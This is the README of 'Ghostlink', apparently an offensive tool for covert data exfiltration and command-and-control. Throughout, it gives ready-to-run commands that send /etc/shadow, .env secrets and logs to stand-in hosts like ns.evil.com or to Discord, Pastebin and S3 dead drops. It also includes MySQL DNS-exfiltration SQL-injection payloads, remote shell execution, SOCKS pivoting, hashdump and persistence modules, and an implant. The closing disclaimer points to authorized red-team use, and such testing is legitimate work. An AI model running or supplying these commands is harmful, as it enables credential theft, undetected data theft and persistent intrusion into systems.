# Ghostlink

**Multi-channel OOB data exfiltration framework — 9 covert channels, FEC, dead drops, SQLi payloads, and optional C2.**

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Channels](https://img.shields.io/badge/covert_channels-9-green)]()
[![Encryption](https://img.shields.io/badge/crypto-ECDHE%20%7C%20AES--256--GCM-red)]()
[![Version](https://img.shields.io/badge/version-1.0-orange)]()

Ghostlink is **not a general-purpose C2**. It's a surgical tool for **getting data out when every other path is blocked**. If Sliver and Cobalt Strike are the army, Ghostlink is the scalpel — specializing in environments monitored by DPI, IDS, and strict firewalls where traditional C2 traffic gets flagged instantly.

---

## Three modes, one tool

| Mode | Purpose | Command |
|---|---|---|
| **Exfil** | Fire-and-forget data exfiltration via 9 covert channels | `-exfil`, `-exfil-glob` |
| **Dead Drop** | Exfiltrate to 3rd-party services (no C2 server needed) | `-dead-drop` |
| **C2** | Interactive shell, SOCKS5, port forwarding, modules | `-shell`, `-exec`, `-socks` |

---

## Architecture

```
                  SENDER                                 RECEIVER
             ┌──────────────┐                        ┌──────────────┐
plaintext ──>│ AES-256-GCM  │                        │ AES-256-GCM  │──> plaintext
             │   encrypt    │                        │   decrypt    │
             └──────┬───────┘                        └──────^───────┘
                    │                                       │
             ┌──────v───────┐                        ┌──────┴───────┐
             │    zlib      │                        │    zlib      │
             │  compress    │                        │  decompress  │
             └──────┬───────┘                        └──────^───────┘
                    │                                       │
             ┌──────v───────┐                        ┌──────┴───────┐
             │ FEC encode   │                        │  FEC decode  │
             │ (XOR parity) │                        │ (reassemble) │
             └──────┬───────┘                        └──────^───────┘
                    │                                       │
             ┌──────v───────┐                        ┌──────┴─────────┐
             │ frame split  │                        │frame reassemble│
             │ (seq + CRC)  │                        │  (seq + CRC)   │
             └──────┬───────┘                        └──────^─────────┘
                    │                                       │
             ┌──────v───────────────────────────────────────┴───────┐
             │             ADAPTIVE CHANNEL SELECTOR                │
             │       entropy scoring · failover · rotate            │
             └──┬────┬────┬────┬────┬────┬────┬────┬────┬──────────┘
                │    │    │    │    │    │    │    │    │
                v    v    v    v    v    v    v    v    v
              DNS  DoH  HTTP   WS  ICMP  ISN  IPID  Time PktSz
```

---

## Covert Channels

| # | Channel | Flag | Technique | Stealth | Throughput |
|---|---------|------|-----------|---------|------------|
| 1 | **DNS** | `-channel dns` | TXT query tunneling, base64 labels | 0.85 | High |
| 2 | **DoH** | `-channel doh` | DNS-over-HTTPS (RFC 8484), bypasses DNS monitoring | 0.96 | High |
| 3 | **HTTP** | `-channel http` | Cookie/User-Agent header smuggling, browser emulation | 0.90 | High |
| 4 | **WebSocket** | `-channel websocket` | Persistent bidirectional tunnel, blends with web apps | 0.92 | High |
| 5 | **ICMP** | `-channel icmp` | Echo request/reply payload embedding | 0.75 | High |
| 6 | **TCP ISN** | `-channel tcp_isn` | Initial Sequence Number steganography (2 bytes/SYN) | 0.70 | Low |
| 7 | **IP ID** | `-channel ip_id` | IPv4 Identification field modulation (2 bytes/pkt) | 0.72 | Low |
| 8 | **Timing** | `-channel timing` | Inter-packet delay encoding (bit0=50ms, bit1=150ms) | 0.95 | ~40 bps |
| 9 | **Packet-size** | `-channel packet_size` | Payload size modulation (3 bits/pkt) | 0.80 | ~300 bps |

---

## Quick Start

```bash
git clone https://github.com/byjanke/ghostlink && cd ghostlink
go build -o ghostlink-server ./cmd/server
go build -o ghostlink-client ./cmd/client
```

---

## Exfiltration (Primary Use Case)

### Fire-and-forget file exfiltration
Sends a file and exits. No shell, no session, just data out.

```bash
# Server
./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key op

# Client — single file
./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key op -exfil /etc/shadow

# Server output:
# [exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
```

### Glob-based exfiltration with content filtering
```bash
# Exfiltrate all .env files, keep only lines matching API_KEY or SECRET
./ghostlink-client -channel http -addr C2:8080 -ecdhe \
  -exfil-glob "/var/www/**/*.env" \
  -exfil-filter "API_KEY|SECRET|DATABASE_URL"

# Exfiltrate all configs under 1MB
./ghostlink-client -channel doh \
  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
  -ecdhe -exfil-glob "/etc/**/*.conf" -exfil-max 1048576
```

### Multi-path exfiltration with Forward Error Correction
Split a single file across N channels in parallel. Losing any single channel doesn't lose data.

```bash
# Uses FEC (8 data + 3 parity shards). Even if 3 channels are blocked, data survives.
./ghostlink-client -multi-path dns,http,icmp,websocket \
  -addr C2:5353 -key op -multi-path-fec -exfil large_db.sql
```

### Dead drop exfiltration (zero C2 infrastructure)
Exfiltrate to public services without a C2 server.

```bash
# Discord webhook
./ghostlink-client -dead-drop discord \
  -dead-drop-url "https://discord.com/api/webhooks/xxx/yyy" \
  -exfil /etc/shadow

# Generic webhook
./ghostlink-client -dead-drop webhook \
  -dead-drop-url "https://your-server.com/collect" \
  -exfil-glob "/var/www/**/*.env"

# Pastebin
./ghostlink-client -dead-drop pastebin \
  -dead-drop-url "https://pastebin.com/api/api_post.php" \
  -dead-drop-key "YOUR_PASTEBIN_API_KEY" \
  -exfil /tmp/sensitive.txt

# S3
./ghostlink-client -dead-drop s3 \
  -dead-drop-bucket "backup-logs" \
  -dead-drop-region "us-east-1" \
  -dead-drop-key "AKIAXXX:secret" \
  -exfil /var/log/auth.log
```

---

## SQLi OOB Payload Generator

Generate SQL injection payloads for DNS/HTTP OOB data exfiltration. Supports MySQL, MSSQL, Oracle, PostgreSQL.

```bash
# Server-side generation
./ghostlink-server -channel dns -addr 0.0.0.0:5353

# In the c2 console:
c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"

=== MySQL DNS OOB Payloads === (domain: ns.evil.com)

# Method 1: LOAD_FILE (requires FILE privilege, Windows UNC path)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user LIMIT 1), '.ns.evil.com\\a'));

# Method 2: Extract all tables
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '.ns.evil.com\\a'));
```

---

## C2 Features (Interactive Mode)

### Authoritative DNS Mode
Tunnels through the real DNS hierarchy. Works behind corporate firewalls that only allow internal DNS.

```bash
# C2 server (authoritative NS)
sudo ./ghostlink-server -domain ns.example.com -addr 0.0.0.0:53

# Implant
./ghostlink-client -domain ns.example.com -exec "whoami; hostname"
```

### Encryption
| Mode | Flag | Description |
|---|---|---|
| **ECDHE** | `-ecdhe` | P-256 key exchange per session. Forward secrecy. |
| **PSK** | `-key <pass>` | SHA-256 derived key. AES-256-GCM with random 12-byte nonce per message. |
| **Plain** | *(default)* | No encryption. Raw covert channel only. |

### DNS-over-HTTPS (bypass DNS monitoring)
```bash
./ghostlink-server -channel doh -addr 0.0.0.0:443 -ecdhe
./ghostlink-client -channel doh -addr http://C2:443 -ecdhe -exec "whoami"

# Via Cloudflare (traffic looks like normal DoH)
./ghostlink-client -channel doh \
  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
  -ecdhe -exec "cat /etc/shadow"
```

### SOCKS5 Proxy
```bash
./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
./ghostlink-client -channel websocket -addr C2:8443 -ecdhe -socks 1080

curl --socks5 127.0.0.1:1080 http://internal.corp:8080/admin
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Multi-Channel Hopping
```bash
./ghostlink-client -hop dns,http,websocket -addr C2:5353 -ecdhe
# [hop] dns -> http -> websocket -> dns (30s rotation)
```

### Domain Fronting
```bash
./ghostlink-client -channel http -addr C2:443 -ecdhe -front ajax.googleapis.com
```

### Canary / Tripwire Mode
Detects channel disruption and auto-responds.

```bash
./ghostlink-client -channel dns -addr C2:5353 -key op -canary -exfil /etc/shadow

# If DNS monitoring blocks the channel:
# [canary] channel degraded — switching to backup
# [canary] channel silent — silencing for 24h
# [canary] channel dead
```

### Beacon Jitter Profiles
```bash
./ghostlink-client -channel http -addr C2:8080 -ecdhe -jitter office
./ghostlink-client -channel doh -addr C2:443 -ecdhe \
  -jitter low_slow -reconnect -retries 50
```

### Session Persistence
Auto-reconnect with exponential backoff.

```bash
./ghostlink-client -channel dns -addr C2:5353 -key op -reconnect -retries 20 -shell
```

### Multi-Session C2 Console
```
ghostlink v1.0 | dns | 0.0.0.0:5353 | PSK | proto v2
[*] waiting for connections...
[+] session from 10.0.0.5:42891
[+] session #1 registered

c2> sessions
[*] 1 active session(s):
  * #1 — 10.0.0.5:42891

c2> exec whoami
[*] command sent to session #1: whoami
[result] root

c2> exfils
[*] 2 exfiltrated files:
  shadow_1 (1024 bytes)
  .env_1 (512 bytes)

c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"
```

**Server commands:** `sessions`, `use <id>`, `kill <id>`, `exec <cmd>`, `shell`, `upload`, `download`, `ping`, `modules`, `run`, `sqli`, `exfils`, `help`

---

## Proof of Exfil

Every exfiltrated file receives a SHA-256 acknowledgement:

```
[exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
```

The implant receives: `[exfil] server ack: OK:shadow:a1b2c3d4`

---

## Forward Error Correction

Packets lost over UDP-based channels (DNS, ICMP, IP ID, timing) don't corrupt data. XOR-based parity shards enable full data reconstruction.

- 4KB data → 4 data + 2 parity shards (33% redundancy, tolerates 2 lost shards)
- 100KB data → 12 data + 4 parity shards (33% redundancy, tolerates 4 lost shards)
- Auto-tuned by data size

---

## Post-Exploitation Modules

8 built-in modules: `sysinfo`, `portscan`, `ps`, `netstat`, `env`, `screenshot`, `persist`, `hashdump`

```bash
c2> run sysinfo
c2> run portscan 10.10.10.0/24 22,80,443,3389
c2> run persist cron /tmp/implant
```

---

## C Implant

Lightweight C implant (~30KB compiled) with zero dependencies.

```bash
gcc -Os -s -o ghostimpl implant/ghostimpl.c
./ghostimpl dns 10.0.0.5 53 ns.evil.com "whoami"
```

---

## DNS Reconnaissance

```bash
./ghostlink-client -dns-recon
```

Probes resolver availability, record type support, and recommends the optimal channel.

---

## Comparison

| | Ghostlink | Sliver | dnscat2 | Cloak |
|---|---|---|---|---|
| **Purpose** | OOB exfil + C2 | Full C2 platform | DNS tunnel | C2 |
| Covert channels | **9** | 3-4 | 1 | 1 |
| DNS-over-HTTPS | Yes | — | — | — |
| TCP ISN / IP ID stego | **Yes** | — | — | — |
| Timing / Pkt-size | **Yes** | — | — | — |
| Dead drops (Discord/S3) | **Yes** | — | — | — |
| SQLi OOB generator | **Yes** | — | — | — |
| Multi-path + FEC | **Yes** | — | — | — |
| Forward Error Correction | **Yes** | — | — | — |
| Canary / tripwire | **Yes** | — | — | — |
| Proof of Exfil (SHA-256) | **Yes** | — | — | — |
| SOCKS5 proxy | Yes | Yes | — | — |
| Multi-session C2 | Yes | Yes | — | — |
| Beacon jitter profiles | 5 profiles | Built-in | — | — |
| Domain fronting | Yes | Yes | — | Yes |
| C implant | Yes | — | — | — |

---

## Protocol

Ghostlink v1.0 uses protocol version 2:

```
v2 message format (8 bytes header):
  [version:1][type:1][stream_id:4][payload_len:2][payload:N]

Message types (v1.0):
  Shell: Stdin(0x01), Stdout(0x02), Stderr(0x03)
  Cmd:   Req(0x04), Res(0x05)
  File:  Put(0x06), GetReq(0x07), GetChunk(0x08)
  Fwd:   Connect(0x10), Data(0x11), Close(0x12)
  Socks: Connect(0x13), Data(0x14), Close(0x15)
  Ping:  Ping(0x20), Pong(0x21)
  Session: Reconnect(0x30), ID(0x31)
  Module: List(0x40), Exec(0x41), Result(0x42)
  Exfil: File(0x50), Glob(0x51), Ack(0x52), Chunk(0x53)
  DeadDrop: Send(0x54), Ack(0x55)
  Canary: Alert(0x60), Check(0x61)
  Error: Error(0xFF)
```

---

## Disclaimer

This tool is for **authorized red team assessments, penetration testing, and security research only**. Unauthorized use on networks you do not own or have explicit permission to test is illegal.

## License

MIT — see [LICENSE](LICENSE)

---

[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=flat&logo=buymeacoffee&logoColor=black)](https://www.buymeacoffee.com/sevbandonmez)
